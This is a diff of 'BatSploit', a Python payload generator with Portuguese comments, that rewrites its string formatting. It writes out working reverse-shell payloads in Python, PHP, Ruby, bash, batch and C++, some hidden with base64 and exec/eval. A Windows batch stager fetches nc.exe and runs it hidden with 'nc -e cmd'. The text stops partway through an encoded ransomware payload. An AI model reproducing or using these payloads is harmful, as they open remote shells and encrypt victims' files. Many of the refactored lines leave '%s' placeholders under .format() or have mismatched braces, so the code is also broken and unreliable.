@@ -140,24 +140,24 @@ class BatSploit(object):
 		host = lhost.split("=")[1] # local host para escutar a conexão
 		port = lport.split("=")[1] # local port para escutar a conexão
 		sys.stdout.write(colored("\n ======", "green"))
-		sys.stdout.write(colored(" Handler started at %s:%s "%(host, port), "white"))
+		sys.stdout.write(colored(" Handler started at {host}:{port}".format(host=host, port=int(port)), "white"))
 		sys.stdout.write(colored("======\n", "green"))
 		if self.platform == "Windows":
-			os.system("start handler.py %s %s"%(host, port))
+			os.system("start python handler.py %s %s".format(host=host, port=int(port)))
 		elif self.platform == "Linux":
-			os.system("gnome-terminal python handler.py %s %s"%(host, port))
+			os.system("gnome-terminal python handler.py %s %s".format(host=host, port=int(port)))
 
 	def nc_bind(self, lhost, lport):
 		# isso escuta as conecxoes com netcat
 		host = lhost.split("=")[1]
 		port = lport.split("=")[1]
 		sys.stdout.write(colored("\n ======", "green"))
-		sys.stdout.write(colored(" Handler started at %s:%s "%(host, port), "white"))
+		sys.stdout.write(colored(" Handler started at {host}:{port}".format(host=host, port=int(port)), "white"))
 		sys.stdout.write(colored("======\n", "green"))
 		if self.platform == "Windows":
-			os.system("start nc.exe -nvlp %s"%(port))
+			os.system("start nc.exe -nvlp {port}".format(port))
 		elif self.platform == "Linux":
-			os.system("gnome-terminal nc -nvlp %s"%(port))
+			os.system("gnome-terminal nc -nvlp {port}".format(port))
 
 	def compilers_verify(self):
 		# verifica se os compiladores de c++ existem
@@ -186,17 +186,17 @@ class BatSploit(object):
 		host = lhost.split("=")[1] # local host para o payload se conectar
 		port = int(lport.split("=")[1]) # local port para o payload se conectar
 		sys.stdout.write(colored("\n ======", "green"))
-		sys.stdout.write(colored(" Creating Payload : %s "%(payload), "white"))
+		sys.stdout.write(colored(" Creating Payload : %s ".format(payload), "white"))
 		sys.stdout.write(colored("======\n", "green"))
 		if payload == 'python/netcat/reverse_tcp':
 			# code ...
 			code = "import socket,os\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-			code += "s.connect(('%s', %i))\n"%(host, port)
+			code += "s.connect(('%s', %i))\n".format(host=host, port=int(port))
 			code += "while True:\n"
 			code += "	s.send(os.popen(s.recv(1024)).read())"
 			encode = code.encode('base64').replace("\n", "") # isso codifica o código
-			payload_coded = "string = '%s'\n"%(encode)
+			payload_coded = "string = '%s'\n".format(encode)
 			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(payload_coded) # escreve o código no arquivo
@@ -205,24 +205,24 @@ class BatSploit(object):
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'python/batsploit/reverse_tcp':
 			# code
 			code = "import socket, os\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-			code += "s.connect(('%s', %i))\n"%(host, port)
+			code += "s.connect(('%s', %i))\n".format(host=host, port=int(port))
 			code += "s.send('[~] Garanted Access by BatSploit 2.0 [~]')\n"
 			code += "while True:\n"
 			code += "	saida_cmd = os.popen(s.recv(1024)).read()\n"
@@ -230,7 +230,7 @@ class BatSploit(object):
 			code += "		saida_cmd = '[+] Executed !'\n"
 			code += "	s.send(saida_cmd)"
 			encode = code.encode('base64').replace("\n", "") # isso codifica o código
-			payload_coded = "string = '%s'\n"%(encode)
+			payload_coded = "string = '%s'\n".format(encode)
 			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(payload_coded) # escreve o código no arquivo
@@ -238,26 +238,26 @@ class BatSploit(object):
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'windows/netcat/reverse_tcp':
 			# code 
 			code = "@echo off\n"
 			code += "color 7f && mode 20, 10\n"
 			code += "cd %TEMP%\n"
-			code += "echo powershell(New-Object System.Net.WebClient).DownloadFile('http://github.com/proxyanon/BatSploit/raw/master/nc.exe', 'nc.exe') > bd.bat\n"
-			code += "echo nc.exe %s %i -e cmd >> bd.bat\n"%(host, port)
+			code += "echo powershell -ExecutionPolicy bypass (New-Object System.Net.WebClient).DownloadFile('http://github.com/proxyanon/BatSploit/raw/master/nc.exe', 'nc.exe') > bd.bat\n"
+			code += "echo nc.exe {host} {port} -e cmd >> bd.bat\n".format(host=host, port=int(port))
 			code += "powershell -W hidden ./bd.bat"
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(code) # escreve o código no arquivo
@@ -265,47 +265,47 @@ class BatSploit(object):
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'linux/netcat/reverse_tcp':
 			# code
 			code = "#!/bin/bash\n"
-			code += "nc %s %i -e /bin/bash &> dismown && clear"%(host, port)
+			code += "nc %s %i -e /bin/bash &> dismown && clear".format(host=host, port=int(port))
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(code) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "{name}" "compiled/{name}" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'php/socket/reverse_tcp':
 			# code 
 			code = "<?php\n"
 			code += "$s = socket_create(AF_INET, SOCK_STREAM, 0);\n"
-			code += "$con = socket_connect($s, '%s', %i);\n"%(host, port)
+			code += "$con = socket_connect($s, '{host}', {port));\n".format(host=host, port=int(port))
 			code += "while(1==1):\n"
 			code += "	socket_write($s, fread(popen(socket_read($s, 1024), 'r'), 10024));\n"
 			code += "endwhile;\n"
@@ -316,31 +316,31 @@ class BatSploit(object):
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "{name}" "compiled/{name}" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'python/meterpreter/reverse_tcp':
 			# code ...
 			code = "import socket,struct\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-			code += "s.connect(('%s', %i))\n"%(host, port)
+			code += "s.connect(('{host}', {port}))\n".format(host=host, port=int(port))
 			code += "packet=struct.unpack('>I',s.recv(4))[0]\n"
 			code += "data=s.recv(packet)\n"
 			code += "while len(data)<packet:\n"
 			code += "	data+=s.recv(packet-len(data))\n"
 			code += "exec(data,{'s':s})"
 			encode = code.encode('base64').replace("\n", "") # isso codifica o código
-			payload_coded = "exec('%s'.decode('base64'))"%(encode) # isso decodifica e executa o payload
+			payload_coded = "exec('%s'.decode('base64'))".format(encode) # isso decodifica e executa o payload
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(payload_coded) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
@@ -348,24 +348,24 @@ class BatSploit(object):
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'php/netcat/reverse_tcp':
 			# code ...
-			code = "$s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;"%(host, port)
+			code = "$s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;".format(host=host, port=int(port))
 			encode = code.encode('base64').replace("\n", "")
-			payload_coded = "<?php $string=base64_decode('%s');\n"%(encode)
+			payload_coded = "<?php $string=base64_decode('%s');\n".format(encode)
 			payload_coded += "eval($string);?>"
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(payload_coded)
@@ -374,23 +374,23 @@ class BatSploit(object):
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "{name}" "compiled/{name}" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'ruby/netcat/reverse_tcp':
 			# code ...
 			code = "require 'socket'\n"
-			code += "s=TCPSocket.open('%s', %i)\n"%(host,port)
+			code += "s=TCPSocket.open('{host}', {port})\n".format(host=host, port=int(port))
 			code += "while msg = s.gets\n"
 			code += "	IO.popen(msg, 'r') do |pipe|\n"
 			code += "		s.puts pipe.gets\n"
@@ -404,23 +404,23 @@ class BatSploit(object):
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == "php/meterpreter/reverse_tcp":
 			# code ...
-			code = "$host = '%s';\n"%(host)
-			code += "$port = %i;\n"%(port)
+			code = "$host = '{}';\n".format(host)
+			code += "$port = {};\n".format(port)
 			code += "$s = fsockopen($host, $port);\n"
 			code += "$s_type = 'stream';\n"
 			code += "$len = fread($s, 4);\n"
@@ -438,7 +438,7 @@ class BatSploit(object):
 			code += "die();"
 			encode = code.encode('base64').replace("\n", "");
 			payload_coded = "<?php\n"
-			payload_coded += "$string=base64_decode('%s');\n"%(encode)
+			payload_coded += "$string=base64_decode('%s');\n".format(encode)
 			payload_coded += "eval($string);\n"
 			payload_coded += "?>"
 			payload_file = open(name, 'w') # abri o arquivo dst
@@ -448,19 +448,19 @@ class BatSploit(object):
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored("Payload was created ! \n", "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("Name : %s ".format(name), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
 			sys.stdout.write(colored("\n[+] ", "green"))
-			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
 			if self.platform == "Windows":
-				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
-				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+				os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
 		elif payload == 'windows/c++/powershell_reverse_tcp':
 			# code ...
 			verify = self.compilers_verify()
@@ -486,23 +486,23 @@ class BatSploit(object):
 				sys.stdout.write(colored("\n[+] ", "green"))
 				sys.stdout.write(colored("Payload was created ! \n", "white"))
 				sys.stdout.write(colored("\n[+] ", "green"))
-				sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+				sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 				sys.stdout.write(colored("\n[+] ", "green"))
-				sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+				sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 				sys.stdout.write(colored("\n[+] ", "green"))
-				sys.stdout.write(colored("Name : %s "%(name), "white"))
+				sys.stdout.write(colored("Name : %s ".format(name), "white"))
 				sys.stdout.write(colored("\n[+] ", "yellow"))
 				sys.stdout.write(colored("Compiling ...", "white"))
 				if self.platform == "Windows":
 					bin_ = os.path.abspath('cpp\\bin\\mingw32-c++.exe') # path do compilador de C
-					os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s && cd ../../ && del %s'%(bin_,name,new_name,name)) # compila para qualquer windows rodar					
+					os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s && cd ../../ && del %s'.format(bin_,name,new_name,name)) # compila para qualquer windows rodar					
 					size_payload = os.path.getsize("compiled/"+new_name) / 1048576 # tamanho do payload
 					sys.stdout.write(colored("\n[+] ", "green"))
-					sys.stdout.write(colored("Size : %i mb "%(size_payload), "white"))
+					sys.stdout.write(colored("Size : %i mb ".format(size_payload), "white"))
 					sys.stdout.write(colored("\n[+] ", "green"))
-					sys.stdout.write(colored("Path : compiled/%s\n"%(new_name), "white"))
+					sys.stdout.write(colored("Path : compiled/%s\n".format(new_name), "white"))
 				elif self.platform == "Linux":
-					os.system("i586-mingw32msvc-gcc %s -o %s"%(name,new_name))
+					os.system("i586-mingw32msvc-gcc %s -o %s".format(name,new_name))
 		elif payload == 'windows/c++/socket_reverse_tcp':
 			# code ...
 			verify = self.compilers_verify()
@@ -519,23 +519,23 @@ class BatSploit(object):
 				sys.stdout.write(colored("\n[+] ", "green"))
 				sys.stdout.write(colored("Payload was created ! \n", "white"))
 				sys.stdout.write(colored("\n[+] ", "green"))
-				sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+				sys.stdout.write(colored("LHOST : %s".format(host), "white"))
 				sys.stdout.write(colored("\n[+] ", "green"))
-				sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+				sys.stdout.write(colored("LPORT : %i".format(port), "white"))
 				sys.stdout.write(colored("\n[+] ", "green"))
-				sys.stdout.write(colored("Name : %s "%(name), "white"))
+				sys.stdout.write(colored("Name : %s ".format(name), "white"))
 				sys.stdout.write(colored("\n[+] ", "yellow"))
 				sys.stdout.write(colored("Compiling ...", "white"))
 				if self.platform == "Windows":
 					bin_ = os.path.abspath('cpp\\bin\\mingw32-c++.exe') # path do compilador de C
-					os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s -lws2_32 && cd ../../ && del %s'%(bin_,name,new_name,name)) # compila para qualquer windows rodar					
+					os.system('@echo off && cd cpp/bin && "%s" -static-libgcc -static-libstdc++ ../../%s -o ../../compiled/%s -lws2_32 && cd ../../ && del %s'.format(bin_,name,new_name,name)) # compila para qualquer windows rodar					
 					size_payload = os.path.getsize("compiled/"+new_name) / 1048576 # tamanho do payload
 					sys.stdout.write(colored("\n[+] ", "green"))
-					sys.stdout.write(colored("Size : %i mb "%(size_payload), "white"))
+					sys.stdout.write(colored("Size : %i mb ".format(size_payload), "white"))
 					sys.stdout.write(colored("\n[+] ", "green"))
-					sys.stdout.write(colored("Path : compiled/%s\n"%(new_name), "white"))
+					sys.stdout.write(colored("Path : compiled/%s\n".format(new_name), "white"))
 				elif self.platform == "Linux":
-					os.system("i586-mingw32msvc-gcc %s -o %s"%(name,new_name))
+					os.system("i586-mingw32msvc-gcc %s -o %s".format(name,new_name))
 		elif payload == 'python/ransomware':
 			# code ...
 			code = "Iy0qLWNvZGluZzogdXRmLTgtKi0NCmltcG9ydCBvcywgaGFzaGxpYiwgc3lzLCBwbGF0Zm9ybSwgdGltZQ0KDQp0cnk6DQogICAgICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIjoNCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNscyIpICMgbGltcGEgYSB0ZWxhIHNlIGZvciB3aW5kb3dzDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgIyEvdXNyL2Jpbi9weXRob24NCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikgIyBsaW1wYSBhIHRlbGEgc2UgZm9yIGxpbnV4DQogICAgICAgIHByaW50ICJcblsrXSBCYXRTcGxvaXQgUmFuc29td2FyZSBcbiINCiAgICAgICAgcHJpbnQgIiBAQXV0aG9yIDogUHJvWHkgU2VjIg0KICAgICAgICBwcmludCAiIEBWZXJzaW9uIDogMi4wLjAiDQogICAgICAgIHByaW50ICIgPGdpdGh1Yi5jb20vcHJveHlhbm9uLz5cbiIgIyBiYW5uZXINCiAgICAgICAgaWYgbGVuKHN5cy5hcmd2KSA+PSAyOg0KICAgICAgICAgICAgICAgIHBhdGhfdG9fZW5jcnlwdCA9IHN5cy5hcmd2WzFdICMgcGFzdGEgcGFyYSBzZXIgY3JpcHRvZ3JhZmFkYQ0KICAgICAgICAgICAgICAgIHByaW50ICIgPT09PT09PT09PT09PT09IFI0bnMwbXc0cjMgc3RhcnRlZCA9PT09PT09PT09PT09PT1cbiINCiAgICAgICAgICAgICAgICBmb3IgcGF0aHMsZGlycyxmaWxlcyBpbiBvcy53YWxrKHBhdGhfdG9fZW5jcnlwdCk6DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAJZmxhZyA9IHBhdGhzKyJcXCIrZmlsZSAjIGxpc3RhIHRvZG9zIG9zIGFycXVpdm9zIGUgc3VicGFzdGFzIGRvIHBhdGgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCWZsYWcgPSBwYXRocysiLyIrZmlsZSAjIGxpc3RhIHRvZG9zIG9zIGFycXVpdm9zIGUgc3VicGFzdGFzIGRvIHBhdGgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBFbmNyeXB0IDogJXMiJShmbGFnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCQloYW5kbGVyID0gb3BlbihmbGFnLCAicmIiKSAjIGxlciBvIGNvbnRldWRvIGRlIHRvZG9zIG9zIGFycXVpdm9zDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCWV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAkJcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudCA9IGhhbmRsZXIucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBNZW1vcnlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50ID0gImRhdGEiICMgc2UgbyBhcnF1aXZvIGZvciBtdWl0byBncmFuZGUsIG8gY29udGV1ZG8gcmVjZWJlICJkYXRhIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ID0gIlsrXSBZb3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQgOiAiICsgaGFzaGxpYi5zaGE1MTIoY29udGVudCkuaGV4ZGlnZXN0KCkgIyBjaGF2ZSBkZSBjcmlwdG9ncmFmaWEgdXNhZGEgc2hhNTEyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld19maWxlcyA9IG9wZW4oZmxhZy5zcGxpdCgiLiIpWzBdK2hhc2hsaWIubWQ1KHRpbWUuY3RpbWUoKSkuaGV4ZGlnZXN0KCkrIi5lbmNyeXB0ZWQiLCAid2I